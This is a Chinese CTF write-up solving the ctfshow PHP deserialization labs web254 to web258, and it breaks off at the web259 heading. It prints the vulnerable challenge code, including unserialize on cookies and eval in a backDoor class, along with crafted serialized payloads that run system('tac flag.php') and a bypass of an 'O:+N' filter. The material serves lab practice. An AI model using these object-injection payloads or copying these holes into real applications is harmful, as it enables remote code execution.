## 写在前面

开始进行反序列化的学习

——KonDream 2022年1月20日19:04:12

## web254

```php
<?php

error_reporting(0);
highlight_file(__FILE__);
include('flag.php');

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;

    public function checkVip(){
        return $this->isVip;
    }
    public function login($u,$p){
        if($this->username===$u&&$this->password===$p){
            $this->isVip=true;
        }
        return $this->isVip;
    }
    public function vipOneKeyGetFlag(){
        if($this->isVip){
            global $flag;
            echo "your flag is ".$flag;
        }else{
            echo "no vip, no flag";
        }
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = new ctfShowUser();
    if($user->login($username,$password)){
        if($user->checkVip()){
            $user->vipOneKeyGetFlag();
        }
    }else{
        echo "no vip,no flag";
    }
}

# your flag is ctfshow{103cfd99-e4c4-45bf-b062-ae1c79d6c90f}
```
第一题很简单，代码逻辑是get两个参数，一个用户名，一个密码，第36行判断传入的用户名和密码是否和 ctfShowUser 类中的用户名密码匹配，如果匹配 isVIP 返回true，进而满足36、37、22行的判断，输出flag

``payload：?username=xxxxxx&password=xxxxxx``

## web255

```php
<?php

error_reporting(0);
highlight_file(__FILE__);
include('flag.php');

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;

    public function checkVip(){
        return $this->isVip;
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function vipOneKeyGetFlag(){
        if($this->isVip){
            global $flag;
            echo "your flag is ".$flag;
        }else{
            echo "no vip, no flag";
        }
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = unserialize($_COOKIE['user']);    
    if($user->login($username,$password)){
        if($user->checkVip()){
            $user->vipOneKeyGetFlag();
        }
    }else{
        echo "no vip,no flag";
    }
}
```

和上一题不同的是，在15行的login函数中没有设置isVIP=true，所以我们就需要通过第32行反序列化将其设值为true

```php
<?php

class ctfShowUser{
    public $isVip=true;
}

echo serialize(new ctfShowUser);   
# O:11:"ctfShowUser":1:{s:5:"isVip";b:1;}
```

传的是cookie，记得url编码一次

![image-20220120193505878](image/ctfshow-反序列化(254-278)/image-20220120193505878.png)

## web256

```php
<?php

error_reporting(0);
highlight_file(__FILE__);
include('flag.php');

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;

    public function checkVip(){
        return $this->isVip;
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function vipOneKeyGetFlag(){
        if($this->isVip){
            global $flag;
            if($this->username!==$this->password){
                    echo "your flag is ".$flag;
              }
        }else{
            echo "no vip, no flag";
        }
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = unserialize($_COOKIE['user']);    
    if($user->login($username,$password)){
        if($user->checkVip()){
            $user->vipOneKeyGetFlag();
        }
    }else{
        echo "no vip,no flag";
    }
}
```

第21行要求用户名密码不同，也是通过反序列化完成

```php
<?php

class ctfShowUser{
    public $username='123';
    public $password='456';
    public $isVip=true;
}

echo urlencode(serialize(new ctfShowUser));   
# O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A3%3A%22123%22%3Bs%3A8%3A%22password%22%3Bs%3A3%3A%22456%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D
```

这里将用户名和密码设置为不同，然后get传参即可

![image-20220120194216379](image/ctfshow-反序列化(254-278)/image-20220120194216379.png)

## web257

```php
<?php

error_reporting(0);
highlight_file(__FILE__);

class ctfShowUser{
    private $username='xxxxxx';
    private $password='xxxxxx';
    private $isVip=false;
    private $class = 'info';

    public function __construct(){
        $this->class=new info();
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function __destruct(){
        $this->class->getInfo();
    }

}

class info{
    private $user='xxxxxx';
    public function getInfo(){
        return $this->user;
    }
}

class backDoor{
    private $code;
    public function getInfo(){
        eval($this->code);
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = unserialize($_COOKIE['user']);
    $user->login($username,$password);
}
```

这里出现了反序列化当中的两个魔术方法

>**1.__construct()**
>
>　　**类一执行就开始调用，其作用是拿来初始化一些值。**
>
>**2.__desctruct()**
>
>　　**类执行完毕以后调用，其最主要的作用是拿来做垃圾回收机制。**
>

突破口就是backDoor这个类，第13行在类开始执行时会声明一个info类，我们只需要把它改成backDoor，并加上想要执行的命令即可

```php
<?php

class ctfShowUser{
    private $class = 'backDoor';

    public function __construct(){
        $this->class=new backDoor();
    }

    public function __destruct(){
        $this->class->getInfo();
    }

}


class backDoor{
    private $code="system('tac flag.php');";
    public function getInfo(){
        return $this->code;
    }
}
echo urlencode(serialize(new ctfShowUser));   
// echo serialize(new ctfShowUser);   

# O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A23%3A%22system%28%27tac+flag.php%27%29%3B%22%3B%7D%7D
```

![image-20220120201421924](image/ctfshow-反序列化(254-278)/image-20220120201421924.png)

## web258

```php
<?php

error_reporting(0);
highlight_file(__FILE__);

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;
    public $class = 'info';

    public function __construct(){
        $this->class=new info();
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function __destruct(){
        $this->class->getInfo();
    }

}

class info{
    public $user='xxxxxx';
    public function getInfo(){
        return $this->user;
    }
}

class backDoor{
    public $code;
    public function getInfo(){
        eval($this->code);
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    if(!preg_match('/[oc]:\d+:/i', $_COOKIE['user'])){
        $user = unserialize($_COOKIE['user']);
    }
    $user->login($username,$password);
}
```

和上一题一样，但是过滤了cookie中的O:[0-9]和C:[0-9]，防止对象被反序列化

这是个wordpress经典的漏洞，原理是在处理序列化字符串时，遇到+就退出序列处理，所以形如O:+8和O:8都能够被 unserialize，且结果相同。我们就可以利用这个姿势绕过正则匹配并同时保证43行能够执行反序列化

``payload：O:+11:"ctfShowUser":1:{s:5:"class";O:+8:"backDoor":1:{s:4:"code";s:23:"system('tac flag.php');";}}``

记得url编码

## web259

